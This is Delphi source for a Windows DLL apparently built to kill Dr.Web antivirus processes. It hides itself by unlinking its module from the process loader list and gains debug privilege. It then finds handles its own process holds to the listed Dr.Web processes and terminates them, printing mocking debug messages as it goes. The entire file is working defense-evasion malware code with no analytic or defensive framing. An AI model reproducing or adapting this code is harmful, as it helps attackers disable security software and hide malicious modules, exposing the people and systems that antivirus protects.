{$E DLL}
{$IMAGEBASE $00600000}
{$R-}
{$Q-}
{$IFDEF minimum}
program dwunprot;
{$ENDIF}
unit dwunprot;
interface

{$R Resources.res}

uses
  Windows, WinNative, RTL;


implementation

const
  DrWebProcessesMax = 6;
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'drweb32w.exe', 'dwengine.exe', 'spiderml.exe', 'spidernt.exe', 'spiderui.exe', 'spidergate.exe', 'spideragent.exe');

var
  hinst: DWORD = $00600000;
  DrWebID: array[0..DrWebProcessesMax] of DWORD;

function LdrGetModuleHandle(lpModule: PWideChar): THANDLE; stdcall;
var
  pTeb1: PTEB;
  f: LIST_ENTRY;
  cur: PLIST_ENTRY;
begin
  result := 0;
  asm
    mov eax, large fs:18h
    mov pTeb1, eax
  end;
  if (lpModule = nil) then
  begin
    result := Cardinal(pTeb1^.Peb^.ImageBaseAddress);
    exit;
  end;
  f := pTeb1^.Peb^.Ldr^.InLoadOrderModuleList;
  cur := f.Flink;
  while (true) do
  begin
    if (PLDR_MODULE(cur)^.EntryPoint <> nil) then
      if (PLDR_MODULE(cur)^.BaseDllName.PStr <> nil) and
        not IsBadReadPtr(PLDR_MODULE(cur)^.BaseDllName.PStr, PLDR_MODULE(cur)^.BaseDllName.Length) then
        if (strcmpiW(PLDR_MODULE(cur)^.BaseDllName.PStr, lpModule) = 0) then
        begin
          result := THANDLE(PLDR_MODULE(cur)^.DllBase);
          PLDR_MODULE(cur^.Blink)^.InLoadOrderModuleList.Flink :=
            PLDR_MODULE(cur)^.InLoadOrderModuleList.Flink;
          PLDR_MODULE(cur^.Flink)^.InLoadOrderModuleList.Blink :=
            PLDR_MODULE(cur)^.InLoadOrderModuleList.Blink;
          break;
        end;
    cur := cur^.Flink;
    if (cur = nil) or (cur = f.Flink) then break;
  end;
end;

var
  ProcessHandles: array[0..99] of THANDLE;
  ProcessHandlesCount: integer;

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;

procedure FillProcessesArray();
var
  h2: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        if (last = DrWebProcessesMax) then break;
        for i := 0 to DrWebProcessesMax do
        begin
          if (strcmpiW(pBuffer.szExeFile, DrWebProcesses[i]) = 0) then
          begin
            DrWebID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  for c := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
    begin
      if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then //Process Type Object ID
      begin
        h2 := buf^.rHandleTable[c].Handle;
        if (ZwQueryInformationProcess(h2, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
        begin
          for i := 0 to DrWebProcessesMax do
          begin
            if (pbi.UniqueProcessId = DrWebID[i]) then
            begin
              ProcessHandles[ProcessHandlesCount] := h2;
              inc(ProcessHandlesCount);
            end;
          end;
        end;

      end;
    end;
  bytesIO := 0;
  ZwFreeVirtualMemory(GetCurrentProcess(), @buf, @bytesIO, MEM_RELEASE);
end;

var
  buf1: LBuf;
  EventHandle: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;

const
  String1: PWideChar = 'Terminating by handle 0x';

procedure main();
var
  i: integer;
begin
  if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
  begin
    EventHandle := 0;
    RtlInitUnicodeString(@str1, '\BaseNamedObjects\dwunprotwait');
    InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
    if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
    begin
      hinst := LdrGetModuleHandle('dwunprot.dll');
      ProcessHandlesCount := 0;
      memzero(@ProcessHandles, 100);
      FillProcessesArray();

      for i := 0 to ProcessHandlesCount - 1 do
      begin
        strcpyW(@buf1[0], String1);

        uitohexW(ProcessHandles[i], strendW(buf1));
        OutputDebugStringW(buf1);

        if (ZwTerminateProcess(ProcessHandles[i], 0) = STATUS_SUCCESS) then
          OutputDebugStringW('Gone to hell successfully')
        else
          OutputDebugStringW('Damn!!! Well you probably know whats next :)');

        ZwClose(ProcessHandles[i]);
      end;

      ZwSetEvent(EventHandle, nil);
      ZwClose(EventHandle);
    end;
  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.


